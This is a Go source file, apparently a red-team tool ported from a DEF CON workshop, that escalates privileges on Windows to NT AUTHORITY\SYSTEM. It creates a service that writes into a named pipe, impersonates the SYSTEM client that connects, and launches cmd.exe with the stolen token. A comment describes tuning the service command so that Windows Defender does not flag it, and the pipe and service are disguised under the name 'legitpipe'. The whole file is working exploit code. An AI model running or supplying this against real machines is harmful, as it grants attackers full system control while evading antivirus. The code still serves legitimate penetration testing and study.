package main

/*
Author: Noah @thesubtlety

This program creates a named pipe, starts a service to echo data into the named pipe, impersonates
the service-client, and starts a new process with the privileges of that user (NT AUTHORITY\SYSTEM).
Permissions to create and start services are required.

This is a basic golang port from zerosum0x0's getsystem.c
https://github.com/zerosum0x0/defcon-25-workshop/blob/master/src/getsystem/getsystem/getsystem.c

https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea
https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken
https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
*/

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

var (
	namedPipe = "\\\\.\\pipe\\legitpipe"

	//Defender doesn't like "cmd /c echo ... > \\\\.\\pipe\\name" and the pipe just needs _something_ sent to it
	serviceCreate = fmt.Sprintf("/R sc.exe create legitpipe binPath= \"cmd.exe /R type C:\\Windows\\win.ini > %s\"", namedPipe)
	serviceStart  = "/R sc.exe start legitpipe"
	serviceDelete = "/R sc.exe delete legitpipe"

	kernel32DLL = syscall.NewLazyDLL("Kernel32.dll")
	advapi32DLL = syscall.NewLazyDLL("Advapi32.dll")

	procCreateNamedPipeA           = kernel32DLL.NewProc("CreateNamedPipeA")
	procConnectNamedPipe           = kernel32DLL.NewProc("ConnectNamedPipe")
	procGetCurrentThread           = kernel32DLL.NewProc("GetCurrentThread")
	procDisconnectNamedPipe        = kernel32DLL.NewProc("DisconnectNamedPipe")
	procImpersonateNamedPipeClient = advapi32DLL.NewProc("ImpersonateNamedPipeClient")
	procOpenThreadToken            = advapi32DLL.NewProc("OpenThreadToken")
	procCreateProcessWithTokenW    = advapi32DLL.NewProc("CreateProcessWithTokenW")
)

const (
	PIPE_ACCESS_DUPLEX       = 0x00000003
	PIPE_TYPE_MESSAGE        = 0x00000004
	PIPE_WAIT                = 0x00000000
	CREATE_NEW_CONSOLE       = 0x00000010
	CREATE_NEW_PROCESS_GROUP = 0x00000200
	PIPE_READMODE_MESSAGE    = 0x00000002
)

func main() {

	fmt.Printf("[+] Creating service: cmd.exe %s\n", serviceCreate)
	c := exec.Command("cmd.exe")
	c.SysProcAttr = &syscall.SysProcAttr{}
	c.SysProcAttr.CmdLine = serviceCreate
	err := c.Run()
	if err != nil {
		fmt.Printf("[-] Couldn't create service: %s\n", err)
		return
	}
	defer deleteService()

	fmt.Printf("[+] Creating named pipe: %s\n", namedPipe)
	pipeHandle, err := createNamedPipeA()
	if err != syscall.Errno(0) {
		fmt.Printf("[-] Couldn't create named pipe: %v\n", err)
		return
	}
	defer cleanup(pipeHandle)

	go func() {
		fmt.Printf("[+] Starting service: cmd.exe %s\n", serviceStart)
		c2 := exec.Command("cmd.exe")
		c2.SysProcAttr = &syscall.SysProcAttr{}
		c2.SysProcAttr.CmdLine = serviceStart
		_, err = c2.Output()
		if err != nil {
			if strings.Contains(err.Error(), "1053") {
				//do nothing
			} else if err != syscall.Errno(0) {
				fmt.Printf("[-] Couldn't start service: %s\n", err)
				return
			}
		}
	}()

	fmt.Println("[+] Connecting...")
	_, err = connectNamedPipe(pipeHandle)
	if err != syscall.Errno(0) {
		fmt.Printf("[-] Couldn't connect to pipe: %v\n", err)
		return
	}

	fmt.Println("[+] Reading from pipe...")
	var done uint32
	err = syscall.ReadFile(pipeHandle, []byte{255}, &done, nil)
	if err != nil {
		fmt.Printf("[-] Error reading from pipe: %s\n", err)
		return
	}

	fmt.Println("[+] Impersonating someone...")
	_, err = impersonateNamedPipeClient(pipeHandle)
	if err != syscall.Errno(0) {
		fmt.Printf("[-] Couldn't connect to pipe:: %s\n", err)
		return
	}

	fmt.Printf("[+] Getting current thread...\n")
	threadHandle, _, err := procGetCurrentThread.Call()
	if err != syscall.Errno(0) {
		fmt.Printf("[-] Couldn't GetCurrentThread: %s\n", err)
		return
	}

	fmt.Printf("[+] Opening thread token...\n")
	tokenHandle, err := openThreadToken(threadHandle)
	if err != syscall.Errno(0) {
		fmt.Printf("[-] Couldn't OpenThreadToken: %s\n", err)
		return
	}

	fmt.Printf("[+] Creating impersonated process...\n")
	_, err = createProcessWithTokenW(tokenHandle)
	if err != syscall.Errno(0) {
		fmt.Printf("[-] Couldn't create process: %s\n", err)
		return
	}
	return
}

func cleanup(pipeHandle syscall.Handle) {
	_, _, err := procDisconnectNamedPipe.Call(uintptr(pipeHandle))
	if err != syscall.Errno(0) {
		fmt.Printf("[-] Couldn't disconnect named pipe: %s\n", err)
	}

	err = syscall.CloseHandle(pipeHandle)
	if err != nil {
		fmt.Printf("[-] Couldn't close handle: %s\n", err)
	}
	return
}

//OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)
func openThreadToken(threadHandle uintptr) (tokenHandle syscall.Handle, err error) {
	_, _, err = procOpenThreadToken.Call(
		uintptr(syscall.Handle(threadHandle)),
		uintptr(uint32(syscall.TOKEN_ALL_ACCESS)),
		uintptr(uint32(0)),
		uintptr(unsafe.Pointer(&tokenHandle)),
	)
	if err != syscall.Errno(0) {
		return syscall.InvalidHandle, os.NewSyscallError("openThreadToken", err)
	}
	return tokenHandle, err
}

func connectNamedPipe(pipeHandle syscall.Handle) (uintptr, error) {
	ret, _, err := procConnectNamedPipe.Call(
		uintptr(pipeHandle),
		uintptr(unsafe.Pointer(nil)),
	)
	return ret, err
}

func impersonateNamedPipeClient(pipeHandle syscall.Handle) (uintptr, error) {
	ret, _, err := procImpersonateNamedPipeClient.Call(
		uintptr(pipeHandle),
	)
	return ret, err
}

//CreateProcessWithTokenW(hToken,0,NULL,cmd,CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi);
func createProcessWithTokenW(tokenHandle syscall.Handle) (uintptr, error) {
	cmd, _ := syscall.UTF16PtrFromString("cmd.exe") //LPWSTR == null terminated 16-bit unicode
	si := new(syscall.StartupInfo)
	si.Cb = uint32(unsafe.Sizeof(*si))
	pi := new(syscall.ProcessInformation)
	r1, _, err := procCreateProcessWithTokenW.Call(
		uintptr(uintptr(tokenHandle)),
		uintptr(uint32(0)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(cmd)),
		uintptr(uint32(CREATE_NEW_CONSOLE|CREATE_NEW_PROCESS_GROUP)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	return r1, err
}

//CreateNamedPipeA(g_szNamedPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, NULL);
func createNamedPipeA() (syscall.Handle, error) {
	pName := StringToCharPtr(namedPipe) //pointer to null terminated 8-bit ANSI
	r1, _, err := procCreateNamedPipeA.Call(
		uintptr(unsafe.Pointer(pName)),
		uintptr(uint32(PIPE_ACCESS_DUPLEX)),
		uintptr(uint32(PIPE_TYPE_MESSAGE|PIPE_WAIT)),
		uintptr(uint32(2)),
		uintptr(uint32(0)),
		uintptr(uint32(0)),
		uintptr(uint32(0)),
		uintptr(unsafe.Pointer(nil)),
	)
	return syscall.Handle(r1), err
}

func deleteService() {
	fmt.Printf("[+] Deleting service: cmd.exe %s\n", serviceStart)
	c := exec.Command("cmd.exe")
	c.SysProcAttr = &syscall.SysProcAttr{}
	c.SysProcAttr.CmdLine = serviceDelete
	out, err := c.Output()
	if err != nil {
		log.Fatalf("[-] Couldn't delete service: %s", err)
	}
	fmt.Printf("[+] Service deleted: %v", string(out))
}

// StringToCharPtr converts a Go string into pointer to a null-terminated cstring.
// This assumes the go string is already ANSI encoded.
//https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
func StringToCharPtr(str string) *uint8 {
	chars := append([]byte(str), 0) // null terminated
	return &chars[0]
}

/*
//it's hard to delete working things
BOOL LogonUserW(
  LPCWSTR lpszUsername,
  LPCWSTR lpszDomain,
  LPCWSTR lpszPassword,
  DWORD   dwLogonType,
  DWORD   dwLogonProvider,
  PHANDLE phToken
);
func logonUserW() (tokenHandle syscall.Handle, err error) {
	user, _ := syscall.UTF16PtrFromString("user")
	domain, _ := syscall.UTF16PtrFromString(".")
	password, _ := syscall.UTF16PtrFromString("password")
	_, _, err := proclogonUserW.Call(
		uintptr(unsafe.Pointer(user)),
		uintptr(unsafe.Pointer(domain)),
		uintptr(unsafe.Pointer(password)),
		uintptr(uint32(2)), //LOGON32_LOGON_INTERACTIVE
		uintptr(uint32(0)), //LOGON32_PROVIDER_DEFAULT
		uintptr(unsafe.Pointer(&tokenHandle)),
	)
	if err != syscall.Errno(0) {
		return syscall.InvalidHandle, os.NewSyscallError("openThreadToken", err)
	}
	return tokenHandle, err
}
*/
